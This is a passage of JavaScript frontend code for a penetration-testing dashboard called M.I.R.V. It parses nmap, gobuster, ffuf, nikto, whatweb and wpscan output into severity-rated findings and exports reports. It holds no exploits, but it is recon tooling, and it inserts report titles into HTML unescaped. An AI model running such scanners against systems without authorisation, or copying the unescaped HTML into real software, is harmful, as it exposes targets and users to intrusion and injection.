/**
 * ============================================================
 *  M.I.R.V. — Frontend Controller
 *  Multi-platform Incident Response & Vulnerabilities
 *  WebSocket · SSH · Arsenal · Reports · Script Builder
 * ============================================================
 */

let ws;

document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    //  DATA SERVICE — check DB status
    // ============================================================
    const dbDot = document.getElementById('db-status-dot');
    const dbText = document.getElementById('db-status-text');
    function updateDbStatus(available) {
        if (!dbDot || !dbText) return;
        if (available) {
            dbDot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-neon';
            dbText.textContent = 'DB: Supabase ✓';
            dbText.className = 'tracking-wider text-neon/70';
        } else {
            dbDot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-gray-800';
            dbText.textContent = 'DB: localStorage';
            dbText.className = 'tracking-wider text-gray-800';
        }
    }
    // Poll DataService until ready
    const _dbCheck = setInterval(() => {
        if (DataService._ready) {
            updateDbStatus(DataService.available);
            clearInterval(_dbCheck);
        }
    }, 100);
    // Timeout after 5s
    setTimeout(() => { clearInterval(_dbCheck); }, 5000);

    // ============================================================
    //  REFERENCIAS DOM
    // ============================================================
    const output          = document.getElementById('terminal-output');
    const statusInd       = document.getElementById('status-indicator');
    const statusText      = document.getElementById('status-text');
    const connBadge       = document.getElementById('conn-badge');
    const connTitle       = document.getElementById('terminal-title');
    const cmdInput        = document.getElementById('cmd-input');
    const btnConnect      = document.getElementById('btn-connect');
    const btnDisconnect   = document.getElementById('btn-disconnect');
    const btnSend         = document.getElementById('btn-send');
    const targetInput     = document.getElementById('target-ip');
    const connSelector    = document.getElementById('conn-selector');
    const activeConn      = document.getElementById('active-conn-display');
    const connDot         = document.getElementById('conn-dot');
    const connLabel       = document.getElementById('conn-label');
    const scriptEditor    = document.getElementById('script-editor');
    const scriptName      = document.getElementById('script-name');
    const deployLog       = document.getElementById('deploy-log');
    const deployLogText   = document.getElementById('deploy-log-text');

    let activeConnectionId = null;
    let connections = [];

    // ============================================================
    //  REPORTS SYSTEM
    // ============================================================
    let reports = [];
    let currentToolRunning = null;   // tool ID currently being run
    let outputBuffer = '';           // accumulated output for parsing
    let pendingTool = null;          // tool pending prompt-based parsing (survives timer expiry)
    let _toolParsed = false;         // true once finishToolOutput has run for this tool
    let toolsUsedThisSession = [];   // [{tool, command}] — track for Mission History

    window.reports = reports; // expose for debugging

    function addReport(report) {
        report.id = Date.now() + Math.random();
        report.timestamp = new Date().toLocaleString();
        reports.unshift(report);
        renderReports();
        _updateReportCount();
    }

    // ── Load reports from backend ──
    async function loadReports() {
        try {
            const resp = await fetch('/api/reports');
            const json = await resp.json();
            if (json.ok && json.data && json.data.length > 0) {
                const existingIds = new Set(reports.map(r => r.db_id));
                for (const r of json.data) {
                    if (!existingIds.has(r.id)) {
                        const parsed = typeof r.parsed_data === 'string' ? JSON.parse(r.parsed_data) : (r.parsed_data || {});
                        reports.push({
                            id: Date.now() + Math.random(),
                            db_id: r.id,
                            type: r.type || 'scan',
                            title: r.title || `Report — ${r.target || 'unknown'}`,
                            target: r.target || '',
                            raw: r.raw_output || '',
                            parsed_data: parsed,
                            timestamp: new Date(r.created_at).toLocaleString()
                        });
                    }
                }
                // Sort: newest first
                reports.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                renderReports();
                _updateReportCount();
            }
        } catch (e) {
            // Silent fail — offline-first
        }
    }

    // ── Render report list ──
    function renderReports() {
        const container = document.getElementById('reports-container');
        const empty = document.getElementById('report-empty');
        const btnExport = document.getElementById('btn-export-reports');
        if (!container) return;

        if (reports.length === 0) {
            if (empty) empty.style.display = '';
            // Remove any report cards
            container.querySelectorAll('.report-card').forEach(el => el.remove());
            if (btnExport) btnExport.disabled = true;
            return;
        }
        if (empty) empty.style.display = 'none';
        if (btnExport) btnExport.disabled = false;

        container.innerHTML = reports.map(r => {
            const summary = r.parsed_data?.summary || {};
            const total = summary.total || 0;
            const bySeverity = summary.by_severity || {};
            const byTool = summary.by_tool || {};
            const toolCount = Object.keys(byTool).length;
            const sevBadges = ['critical', 'high', 'medium', 'low', 'info']
                .filter(s => bySeverity[s])
                .map(s => {
                    const colors = { critical: 'bg-red-900/30 text-red-400', high: 'bg-orange-900/30 text-orange-400', medium: 'bg-yellow-900/30 text-yellow-400', low: 'bg-blue-900/30 text-blue-400', info: 'bg-gray-800/50 text-gray-500' };
                    return `<span class="text-[8px] px-1.5 py-0.5 rounded ${colors[s] || 'bg-gray-800 text-gray-600'}">${s} ${bySeverity[s]}</span>`;
                }).join(' ');
            const toolBadges = Object.entries(byTool).map(([t, c]) =>
                `<span class="text-[8px] text-gray-600">${t} (${c})</span>`
            ).join(' ');

            return `<div class="report-card">
                <div class="flex items-start justify-between gap-2">
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center gap-2 mb-1">
                            <span class="text-[10px] font-semibold text-neon truncate">${r.title || 'Report'}</span>
                            <span class="text-[8px] text-gray-700">${r.timestamp}</span>
                        </div>
                        <div class="flex items-center gap-1.5 flex-wrap">
                            ${sevBadges}
                        </div>
                        <div class="text-[9px] text-gray-600 mt-1">${toolBadges}</div>
                        <div class="text-[9px] text-gray-700 mt-0.5">📍 ${r.target || 'no target'} · 📊 ${total} findings</div>
                    </div>
                    <div class="flex items-center gap-1 flex-shrink-0">
                        <button data-action="report-view" data-idx="${reports.indexOf(r)}" class="text-[9px] text-cyber/70 hover:text-cyber border border-cyber/20 rounded px-2 py-0.5 transition-colors">👁 View</button>
                        <select data-action="report-export" data-idx="${reports.indexOf(r)}" class="bg-void border border-gray-800 rounded px-1 py-0.5 text-[8px] text-gray-400">
                            <option value="">⬇ Export</option>
                            <option value="md">.md</option>
                            <option value="html">.html</option>
                            <option value="pdf">📄 PDF</option>
                        </select>
                        <button data-action="report-delete" data-idx="${reports.indexOf(r)}" class="text-[9px] text-gray-700 hover:text-blood transition-colors">✕</button>
                    </div>
                </div>
            </div>`;
        }).join('');
        _updateReportCount();
    }

    function _updateReportCount() {
        const el = document.getElementById('report-count');
        if (el) el.textContent = `(${reports.length})`;
        const stat = document.getElementById('stat-reports');
        if (stat) stat.textContent = reports.length;
        if (typeof updateStats === 'function') updateStats();
    }

    // ── Generate report from current findings ──
    window.generateReport = async function () {
        if (window.findings && window.findings.length === 0) {
            showToast('⚠️ No findings to report. Run a scan first.');
            return;
        }
        const target = document.getElementById('target-ip')?.value?.trim() || 'unknown';
        const findings = window.findings || [];
        const suggestions = window.suggestions || [];

        showToast('📝 Generating report...');

        try {
            const resp = await fetch('/api/report/generate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target,
                    title: `Scan Report — ${target} — ${new Date().toLocaleString()}`,
                    findings,
                    suggestions
                })
            });
            const json = await resp.json();
            if (json.ok && json.data) {
                const r = json.data;
                const parsed = typeof r.parsed_data === 'string' ? JSON.parse(r.parsed_data) : (r.parsed_data || {});
                addReport({
                    db_id: r.id,
                    type: r.type || 'scan',
                    title: r.title || `Report — ${target}`,
                    target: r.target || target,
                    raw: r.raw_output || '',
                    parsed_data: parsed,
                    timestamp: new Date().toLocaleString()
                });
                showToast(`✅ Report generated: ${r.title}`);
            } else if (json.ok && json.title) {
                // DB unavailable fallback
                addReport({
                    type: 'scan',
                    title: json.title,
                    target: json.target,
                    raw: json.raw_output,
                    parsed_data: json.parsed_data,
                    timestamp: new Date().toLocaleString()
                });
                showToast('✅ Report generated (local only)');
            } else {
                showToast('⚠️ Failed to generate report');
            }
        } catch (e) {
            showToast('⚠️ Error generating report: ' + e.message);
        }
    };

    // ── View report in modal ──
    window.viewReport = function (index) {
        const r = reports[index];
        if (!r) return;
        const modal = document.getElementById('report-modal');
        const title = document.getElementById('report-modal-title');
        const body = document.getElementById('report-modal-body');
        if (!modal || !title || !body) return;

        title.textContent = r.title || 'Report';
        // Store current report index for export
        modal.dataset.reportIndex = index;

        // Render markdown as HTML for readability
        const raw = r.raw || 'No content';
        const html = mdToBasicHTML(raw);
        body.innerHTML = `<div class="prose-xs text-gray-300 leading-relaxed">${html}</div>`;

        modal.classList.remove('hidden');
    };

    window.closeReportModal = function () {
        const modal = document.getElementById('report-modal');
        if (modal) modal.classList.add('hidden');
    };

    // Close modal on background click & Escape key
    document.addEventListener('click', (e) => {
        const modal = document.getElementById('report-modal');
        if (modal && e.target === modal) modal.classList.add('hidden');
    });
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            const modal = document.getElementById('report-modal');
            if (modal && !modal.classList.contains('hidden')) modal.classList.add('hidden');
        }
    });

    // ── Export current report (from modal) ──
    window.exportCurrentReport = function () {
        const modal = document.getElementById('report-modal');
        const idx = parseInt(modal?.dataset?.reportIndex);
        if (isNaN(idx)) return;
        const format = document.getElementById('report-detail-format')?.value || 'md';
        exportReport(idx, format);
    };

    // ── Export a single report ──
    window.exportReport = function (index, format) {
        if (!format) return;
        const r = reports[index];
        if (!r) return;
        const content = r.raw || '# Empty report';
        const title = r.title || 'report';
        const target = r.target || 'unknown';
        const date = new Date().toISOString().slice(0, 10);
        const safeName = `mirv-report-${target}-${date}`;

        if (format === 'md') {
            downloadString(content, `${safeName}.md`, 'text/markdown');
        } else if (format === 'html') {
            const html = buildExportHTML(content, title, 'report');
            downloadString(html, `${safeName}.html`, 'text/html');
        } else if (format === 'pdf') {
            const html = buildExportHTML(content, title, 'report');
            openPDFPreview(html, `${safeName}.pdf`);
        }
        showToast(`⬇ Exported: ${safeName}.${format}`);
    };

    // ── Export all reports ──
    window.exportAllReports = function () {
        if (reports.length === 0) {
            showToast('No reports to export');
            return;
        }
        const format = document.getElementById('reports-format')?.value || 'md';
        // Build a combined document
        let combined = '# M.I.R.V. — All Reports\n\n';
        reports.forEach((r, i) => {
            combined += `---\n## ${i + 1}. ${r.title || 'Report'}\n`;
            combined += `**Target:** ${r.target || '?'}  \n`;
            combined += `**Date:** ${r.timestamp}  \n\n`;
            combined += (r.raw || 'No content') + '\n\n';
        });

        const date = new Date().toISOString().slice(0, 10);
        const safeName = `mirv-all-reports-${date}`;

        if (format === 'md') {
            downloadString(combined, `${safeName}.md`, 'text/markdown');
        } else if (format === 'html') {
            const html = buildExportHTML(combined, 'All Reports', 'report');
            downloadString(html, `${safeName}.html`, 'text/html');
        } else if (format === 'pdf') {
            const html = buildExportHTML(combined, 'All Reports', 'report');
            openPDFPreview(html, `${safeName}.pdf`);
        }
        showToast(`⬇ Exported ${reports.length} reports as ${format}`);
    };

    // ── Delete a single report ──
    window.deleteReport = function (index) {
        const r = reports[index];
        if (!r) return;
        // Delete from backend if it has a db_id
        if (r.db_id) {
            fetch(`/api/reports/${r.db_id}`, { method: 'DELETE' }).catch(() => {});
        }
        reports.splice(index, 1);
        renderReports();
        showToast('🗑️ Report deleted');
    };

    // ── Clear all reports ──
    window.clearReports = function () {
        if (reports.length === 0) return;
        // Delete all from backend
        reports.forEach(r => {
            if (r.db_id) {
                fetch(`/api/reports/${r.db_id}`, { method: 'DELETE' }).catch(() => {});
            }
        });
        reports = [];
        renderReports();
        showToast('🗑️ All reports cleared');
    };

    // Helper: download a string as file
    function downloadString(content, filename, mimeType) {
        const blob = new Blob([content], { type: mimeType });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        setTimeout(() => URL.revokeObjectURL(url), 5000);
    }

    // Helper: convert MD-like syntax → basic HTML
    function mdToBasicHTML(text) {
        if (!text) return '';
        let html = text
            // Escape HTML entities
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            // Headers
            .replace(/^### (.+)$/gm, '<h3 class="text-amber-400 text-[13px] font-semibold mt-3 mb-1">$1</h3>')
            .replace(/^## (.+)$/gm, '<h2 class="text-amber-400 text-[14px] font-bold mt-4 mb-1">$1</h2>')
            .replace(/^# (.+)$/gm, '<h1 class="text-neon text-[15px] font-bold mt-4 mb-2">$1</h1>')
            // Bold
            .replace(/\*\*(.+?)\*\*/g, '<strong class="text-gray-100">$1</strong>')
            // Italic
            .replace(/\*(.+?)\*/g, '<em class="text-gray-400">$1</em>')
            // Inline code
            .replace(/`([^`]+)`/g, '<code class="text-cyber bg-void px-1 rounded text-[10px]">$1</code>')
            // Separator
            .replace(/^---$/gm, '<hr class="border-gray-800 my-3">')
            // Table rows (basic: | a | b |)
            .replace(/^\|(.+)\|$/gm, (m, row) => {
                const cells = row.split('|').map(c => c.trim()).filter(Boolean);
                if (cells.every(c => /^[-]+$/.test(c))) return '<hr class="border-gray-800 my-1">';
                return `<div class="flex gap-4 text-[11px] text-gray-400">${cells.map(c => `<span>${c}</span>`).join('')}</div>`;
            })
            // Unordered list
            .replace(/^- (.+)$/gm, '<li class="text-gray-400 text-[11px] ml-3 list-disc">$1</li>')
            // Line breaks
            .replace(/\n/g, '<br>');
        return html;
    }

    // Helper: build a self-contained HTML document for export
    function buildExportHTML(content, title, type) {
        const bodyHtml = mdToBasicHTML(content);
        return `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>${title} — M.I.R.V.</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0a0b10; color:#c8c8c8; font-family:monospace; font-size:12px; line-height:1.6; padding:40px; }
h1 { color:#d4a843; font-size:18px; margin-bottom:12px; }
h2 { color:#d4a843; font-size:16px; margin-top:20px; margin-bottom:8px; }
h3 { color:#d4a843; font-size:14px; margin-top:16px; margin-bottom:6px; }
code { background:#0f111a; color:#3b9eff; padding:1px 5px; border-radius:3px; font-size:11px; }
hr { border:none; border-top:1px solid #1a1f2e; margin:16px 0; }
strong { color:#e0e0e0; }
em { color:#888; }
li { color:#aaa; margin-left:20px; }
br { content:''; display:block; margin:4px 0; }
@media print { body { padding:20px; background:#fff; color:#333; } h1,h2,h3 { color:#222; } code { background:#eee; color:#333; } }
</style>
</head>
<body>
${bodyHtml}
</body>
</html>`;
    }

    // Helper: open a popup window with print dialog (PDF export)
    function openPDFPreview(htmlContent, filename) {
        const win = window.open('', '_blank', 'width=800,height=600,scrollbars=yes');
        if (!win) {
            showToast('⚠️ Popup blocked. Allow popups for PDF export.');
            return;
        }
        win.document.write(htmlContent);
        win.document.title = filename;
        win.focus();
        setTimeout(() => { win.print(); }, 500);
    }

    // Load reports on init (delayed to let page settle)
    setTimeout(loadReports, 2000);

    // ── Parse Nmap output ──
    function parseNmapOutput(text, target) {
        const report = { type: 'nmap', target, ports: [], os: '', raw: text };

        // Extract open ports
        const portRegex = /(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?/gi;
        let match;
        while ((match = portRegex.exec(text)) !== null) {
            report.ports.push({
                port: match[1],
                protocol: match[2],
                state: 'open',
                service: match[3] || '?',
                version: (match[4] || '').trim()
            });
        }

        // Extract OS
        const osMatch = text.match(/OS details:\s*(.+)/i);
        if (osMatch) report.os = osMatch[1].trim();
        else {
            const osMatch2 = text.match(/Aggressive OS guesses:\s*(.+)/i);
            if (osMatch2) report.os = osMatch2[1].split(',')[0].trim();
        }

        if (report.ports.length > 0 || report.os) {
            addReport(report);
            showToast(`📊 Nmap report: ${report.ports.length} ports`);
        }
        return report;
    }

    // ── Parse Gobuster output ──
    function parseGobusterOutput(text, target) {
        const report = { type: 'gobuster', target, dirs: [], raw: text };

        const dirRegex = /(?:^|\n)\/(\S+)\s+\(Status:\s*(\d+)\)/g;
        let match;
        while ((match = dirRegex.exec(text)) !== null) {
            report.dirs.push({ path: '/' + match[1], status: parseInt(match[2]) });
        }

        // Alternative: "Found: /path (Status: 200) [Size: 123]"
        const dirRegex2 = /Found:\s+(\/\S+)\s+\(Status:\s*(\d+)\)/g;
        while ((match = dirRegex2.exec(text)) !== null) {
            // Avoid duplicates
            if (!report.dirs.some(d => d.path === match[1])) {
                report.dirs.push({ path: match[1], status: parseInt(match[2]) });
            }
        }

        if (report.dirs.length > 0) {
            addReport(report);
            showToast(`📊 Gobuster report: ${report.dirs.length} dirs`);
        }
        return report;
    }

    // ============================================================
    //  FINDINGS SYSTEM (T3MP3ST-style)
    // ============================================================
    const findings = [];
    window.findings = findings; // expose for backend sync + stats

    // Severity helpers
    function severityColor(sev) {
        const map = { critical: '#f87171', high: '#fb923c', medium: '#facc15', low: '#60a5fa', info: '#94a3b8' };
        return map[sev] || '#666';
    }
    function severityBg(sev) {
        const map = { critical: '#1a0a0a', high: '#1a0f0a', medium: '#1a180a', low: '#0a0f1a', info: '#0a0a0a' };
        return map[sev] || '#0a0a0a';
    }
    function severityBadge(sev) {
        const map = { critical: 'CRITICAL', high: 'HIGH', medium: 'MEDIUM', low: 'LOW', info: 'INFO' };
        return map[sev] || 'UNKNOWN';
    }

    // Assign severity based on finding type and data
    function assignSeverity(finding) {
        // Port-based
        if (finding.port === '22') return 'low';
        if (finding.port === '80' || finding.port === '443') return 'info';
        if (['21', '23', '3389', '5900', '5901'].includes(finding.port)) return 'medium';
        if (finding.port === '445' || finding.port === '139') return 'high';

        // Service-based
        if (finding.service && /mysql|postgresql|redis|elastic|mongodb/i.test(finding.service)) return 'high';
        if (finding.service && /apache|nginx|iis|http/i.test(finding.service) && !finding.version) return 'low';
        if (finding.service && /apache|nginx|iis|http/i.test(finding.service) && finding.version) return 'medium';

        // Directory-based
        if (finding.status === 200 || finding.status === 201 || finding.status === 204) return 'medium';
        if (finding.status === 301 || finding.status === 302 || finding.status === 307) return 'low';
        if (finding.status === 401 || finding.status === 403) return 'info';
        if (finding.status === 500) return 'critical';

        // Vulnerability-based
        if (finding.type === 'vuln') return 'critical';
        if (finding.type === 'tech') return 'info';

        return 'info';
    }

    // ── Parsers ──

    function parseNmapFindings(text, target) {
        const items = [];
        const portRegex = /(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?/gi;
        let match;
        while ((match = portRegex.exec(text)) !== null) {
            const finding = {
                tool: 'nmap',
                target,
                type: 'port',
                port: match[1],
                protocol: match[2],
                service: match[3] || '?',
                version: (match[4] || '').trim(),
                raw: match[0]
            };
            finding.severity = assignSeverity(finding);
            items.push(finding);
        }

        // OS detection as finding
        const osMatch = text.match(/OS details:\s*(.+)/i);
        if (osMatch) {
            items.push({
                tool: 'nmap',
                target,
                type: 'os',
                severity: 'info',
                title: 'OS Detected',
                detail: osMatch[1].trim()
            });
        }

        return items;
    }

    function parseGobusterFindings(text, target) {
        const items = [];
        const dirRegex = /(?:^|\n)\/(\S+)\s+\(Status:\s*(\d+)\)/g;
        let match;
        while ((match = dirRegex.exec(text)) !== null) {
            const finding = {
                tool: 'gobuster',
                target,
                type: 'directory',
                path: '/' + match[1],
                status: parseInt(match[2]),
                severity: assignSeverity({ status: parseInt(match[2]) })
            };
            items.push(finding);
        }

        // Also match "Found: /path (Status: 200)" format
        const dirRegex2 = /Found:\s+(\/\S+)\s+\(Status:\s*(\d+)\)/g;
        while ((match = dirRegex2.exec(text)) !== null) {
            if (!items.some(d => d.path === match[1])) {
                items.push({
                    tool: 'gobuster',
                    target,
                    type: 'directory',
                    path: match[1],
                    status: parseInt(match[2]),
                    severity: assignSeverity({ status: parseInt(match[2]) })
                });
            }
        }

        return items;
    }

    function parseNiktoFindings(text, target) {
        const items = [];
        // Nikto: + /path: description
        const vulnRegex = /^\+\s+(\/\S+)?\s*:\s*(.+)$/gm;
        let match;
        while ((match = vulnRegex.exec(text)) !== null) {
            const desc = match[2].trim();
            const finding = {
                tool: 'nikto',
                target,
                type: 'vuln',
                path: match[1] || '/',
                title: desc.substring(0, 80),
                detail: desc,
                severity: assignSeverity({ type: 'vuln' })
            };
            // Adjust severity based on keywords
            if (/allows|bypass|exec|overflow|remote|critical|high/i.test(desc)) finding.severity = 'critical';
            else if (/xss|sqli|path|disclosure|injection/i.test(desc)) finding.severity = 'high';
            else if (/info|version|fingerprint/i.test(desc)) finding.severity = 'info';
            items.push(finding);
        }
        return items;
    }

    function parseWhatwebFindings(text, target) {
        const items = [];
        // whatweb output format: URL [HTTP_CODE] Key[value], Key2[value2]...
        // Group findings per URL into a single consolidated finding with details
        const urlLineRegex = /^(https?:\/\/\S+)\s+(.+)$/gm;
        let urlMatch;
        const seenUrls = new Set(); // dedup by normalized URL
        while ((urlMatch = urlLineRegex.exec(text)) !== null) {
            let url = urlMatch[1];
            // Normalize: remove trailing slash, prefer https
            url = url.replace(/\/+$/, '');
            const normalized = url.replace(/^http:\/\//, 'https://');
            if (seenUrls.has(normalized)) continue;
            seenUrls.add(normalized);
            const rest = urlMatch[2];

            // Extract status code
            const statusMatch = rest.match(/\[(\d+)\s+(.+?)\]/);
            const statusCode = statusMatch ? statusMatch[1] : '?';
            const statusMsg = statusMatch ? statusMatch[2] : '';

            // Extract all Key[Value] pairs
            const bracketRegex = /(\w[\w-]*)?\[([^\]]+)\]/g;
            let bm;
            const techs = [];     // technology items
            const headers = [];   // security/response headers
            const cookies = [];   // cookies
            const uncommons = []; // uncommon headers
            let server = '';
            let title = '';

            while ((bm = bracketRegex.exec(rest)) !== null) {
                const key = bm[1] || '';
                const rawValue = bm[2];
                const vals = rawValue.split(',').map(v => v.trim()).filter(v => v.length > 0);
                for (const val of vals) {
                    if (/^\d+$/.test(val) && val.length < 5) continue;
                    if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(val)) continue;
                    if (/^\w{2,3}$/.test(val) && val === val.toUpperCase()) continue;

                    if (key === 'HTTPServer') { server = val; }
                    else if (key === 'Title') { title = val; }
                    else if (key === 'Cookies') { cookies.push(val); }
                    else if (key === 'UncommonHeaders') { uncommons.push(val); }
                    else if (/^(X-Frame-Options|X-XSS-Protection|Strict-Transport-Security|X-Content-Type-Options)$/i.test(key)) {
                        headers.push(`${key}: ${val}`);
                    } else if (/^(Country|IP|Port)$/i.test(key)) {
                        // Skip location/IP metadata
                    } else {
                        techs.push(key + (val && val !== key ? `[${val}]` : ''));
                    }
                }
            }

            // Build a single consolidated finding per URL
            const detailParts = [];
            if (server) detailParts.push(`🖥️ Server: ${server}`);
            if (title) detailParts.push(`📄 Title: ${title}`);
            if (statusCode) detailParts.push(`📡 HTTP ${statusCode} ${statusMsg}`);
            if (headers.length > 0) detailParts.push(`🛡️ Headers: ${headers.join(', ')}`);
            if (techs.length > 0) detailParts.push(`🔧 Tech: ${techs.join(', ')}`);
            if (cookies.length > 0) detailParts.push(`🍪 Cookies: ${cookies.join(', ')}`);
            if (uncommons.length > 0) detailParts.push(`📎 Extras: ${uncommons.slice(0, 5).join(', ')}${uncommons.length > 5 ? ` +${uncommons.length - 5} more` : ''}`);

            items.push({
                tool: 'whatweb',
                target,
                type: 'tech',
                title: `WhatWeb: ${normalized}`,
                detail: detailParts.join(' | '),
                severity: 'info'
            });
        }
        return items;
    }

    function parseFfufFindings(text, target) {
        const items = [];
        // ffuf: /path [Status: 200, Size: 123]
        const ffufRegex = /(\/\S+)\s+\[Status:\s*(\d+)/g;
        let match;
        while ((match = ffufRegex.exec(text)) !== null) {
            const finding = {
                tool: 'ffuf',
                target,
                type: 'directory',
                path: match[1],
                status: parseInt(match[2]),
                severity: assignSeverity({ status: parseInt(match[2]) })
            };
            items.push(finding);
        }
        return items;
    }

    function parseWpscanFindings(text, target) {
        const items = [];
        // WordPress user enumeration
        const userRegex = /\[\+\]\s*(\S+)\s*$/gm;
        let match;
        while ((match = userRegex.exec(text)) !== null) {
            items.push({
                tool: 'wpscan',
                target,
                type: 'user',
                title: 'WordPress User: ' + match[1],
                detail: 'User found: ' + match[1],
                severity: 'medium'
            });
        }
        // Plugin detection
        const pluginRegex = /\[\+\]\s*.*plugin.*:\s*(\S+)/gi;
        while ((match = pluginRegex.exec(text)) !== null) {
            items.push({
                tool: 'wpscan',
                target,
                type: 'plugin',
                title: 'WP Plugin: ' + match[1],
                detail: 'Plugin detected: ' + match[1],
                severity: 'info'
            });
        }
        return items;
    }

    // ── Main parse dispatcher ──
    function parseToolOutput(tool, text, target) {
        let items = [];
        switch (tool) {
            case 'nmap':      items = parseNmapFindings(text, target); break;
            case 'gobuster':  items = parseGobusterFindings(text, target); break;
            case 'dirb':      items = parseGobusterFindings(text, target); break;
            case 'ffuf':      items = parseFfufFindings(text, target); break;
            case 'nikto':     items = parseNiktoFindings(text, target); break;
            case 'whatweb':   items = parseWhatwebFindings(text, target); break;
            case 'wpscan':    items = parseWpscanFindings(text, target); break;
        }
        return items;
    }

    // ── Build a Set of existing finding keys for fast dedup ──
    function _existingKeys() {
        const s = new Set();
        for (const f of findings) s.add(_findingKey(f));
        return s;
    }

    // ── Sync findings to backend (Supabase) ──
    let _findingsSyncTimer = null;
    function _debounceSync() {
        clearTimeout(_findingsSyncTimer);
        _findingsSyncTimer = setTimeout(_syncFindingsToBackend, 2000);
    }

    async function _syncFindingsToBackend() {
        try {
            // Only send findings that haven't been synced yet
            const unsynced = findings.filter(f => !f._synced);
            if (unsynced.length === 0) return;
            const payload = unsynced.map(f => ({
                tool: f.tool || 'unknown',
                target: f.target || '',
                type: f.type || 'generic',
                severity: f.severity || 'info',
                title: f.title || '',
                detail: f.detail || '',
                port: f.port || '',
                protocol: f.protocol || '',
                service: f.service || '',
                version: f.version || '',
                status: f.status || 0,
                path: f.path || '',
                raw: f.raw || ''
            }));
            const resp = await fetch('/api/findings/bulk', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (resp.ok) {
                // Mark all as synced
                unsynced.forEach(f => f._synced = true);
            }
        } catch (e) {
            // Silent fail — offline-first
        }
    }

    // ── Generic helper: save a report to DB ──
    async function _saveReportToDB(data) {
        try {
            const resp = await fetch('/api/reports', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            const json = await resp.json();
            if (json.ok) {
                console.log('[DB] Report saved:', data.type, data.title);
            }
        } catch (e) {
            console.warn('[DB] Report save failed (offline):', e.message);
        }
    }

    async function _loadFindingsFromBackend() {
        try {
            const resp = await fetch('/api/findings');
            const json = await resp.json();
            if (json.ok && json.data && json.data.length > 0) {
                // Merge with existing findings (avoid dupes)
                const existing = _existingKeys();
                let added = 0;
                for (const item of json.data) {
                    const key = _findingKey({
                        tool: item.tool,
                        target: item.target,
                        type: item.type,
                        port: item.port,
                        protocol: item.protocol,
                        service: item.service,
                        path: item.path,
                        status: item.status,
                        title: item.title,
                        detail: item.detail
                    });
                    if (!existing.has(key)) {
                        existing.add(key);
                        item.id = _hashStr(key);
                        item._synced = true; // already in DB, don't re-sync
                        findings.push(item);
                        added++;
                    }
                }
                if (added > 0) {
                    renderFindings();
                    updateFindingsCount();
                }
            }
        } catch (e) {
            // Silent fail — offline-first
        }
    }

    // ── Add findings (with dedup + backend sync) ──
    function addFindings(items) {
        if (!items || items.length === 0) return;
        const existing = _existingKeys();
        let added = 0;
        for (const item of items) {
            const key = _findingKey(item);
            if (!existing.has(key)) {
                existing.add(key);
                // Give it a deterministic hash from the key for stable identity
                item.id = _hashStr(key);
                findings.unshift(item);
                added++;
            }
        }
        if (added === 0) {
            showToast(`⏭ ${items[0].tool} — 0 new findings (all duplicates)`);
            return;
        }
        renderFindings();
        updateFindingsCount();
        const byTool = items[0].tool || 'scan';
        showToast(`🎯 +${added} ${byTool} finding${added > 1 ? 's' : ''}`);
        _debounceSync();
    }

    // ── Simple string hash for stable finding IDs ──
    function _hashStr(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const chr = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + chr;
            hash |= 0; // Convert to 32bit int
        }
        return Math.abs(hash);
    }

    // ── Render findings cards ──
    function renderFindings(filterSeverity) {
        const container = document.getElementById('findings-list');
        const empty = document.getElementById('findings-empty');
        if (!container) return;

        let list = findings;
        if (filterSeverity && filterSeverity !== 'all') {
            list = findings.filter(f => f.severity === filterSeverity);
        }

        // Text search filter
        const q = (document.getElementById('findings-search')?.value || '').toLowerCase().trim();
        if (q) {
            list = list.filter(f => {
                const haystack = [
                    f.title, f.detail, f.tool, f.target, f.port, f.service,
                    f.path, f.protocol, f.host, f.severity
                ].filter(Boolean).join(' ').toLowerCase();
                return haystack.includes(q);
            });
        }

        if (list.length === 0) {
            container.innerHTML = '<div class="text-center text-[11px] text-gray-700 py-8">No findings match this filter.</div>';
            updateStats();
            return;
        }

        container.innerHTML = list.map(f => _renderOneFinding(f)).join('');
        updateStats();
    }

    // ── Render a single finding card HTML (used by renderFindings + real-time append) ──
    function _renderOneFinding(f) {
        const sev = f.severity || 'info';
        const color = severityColor(sev);
        const bg = severityBg(sev);
        const badge = severityBadge(sev);
        const icon = f.tool === 'nmap' ? '🔍' : f.tool === 'gobuster' || f.tool === 'dirb' ? '📁' :
                     f.tool === 'ffuf' ? '🌐' : f.tool === 'nikto' ? '⚠️' :
                     f.tool === 'whatweb' ? '🔎' : f.tool === 'wpscan' ? '📌' : '🎯';
        let title = f.title || '';
        let subtitle = '';
        if (f.type === 'port') {
            title = `${f.port}/${f.protocol} — ${f.service}`;
            subtitle = f.version || 'no version';
        } else if (f.type === 'directory') {
            title = f.path;
            subtitle = `Status: ${f.status}` + (f.status >= 400 ? ' ⚠️' : '');
        } else if (f.type === 'vuln') {
            title = f.title || 'Potential vulnerability';
            subtitle = f.detail ? f.detail.substring(0, 120) : '';
        } else if (f.type === 'tech') {
            title = f.title;
            subtitle = f.detail ? f.detail.substring(0, 150) : 'Technology detected';
        } else if (f.type === 'os') {
            title = f.detail || 'Unknown OS';
            subtitle = 'OS Detection';
        } else if (f.type === 'user' || f.type === 'plugin') {
            subtitle = f.type === 'user' ? 'User enumeration' : 'Plugin detected';
        } else if (f.detail) {
            subtitle = f.detail.substring(0, 150);
        }
        const isInfo = sev === 'info';
        return `
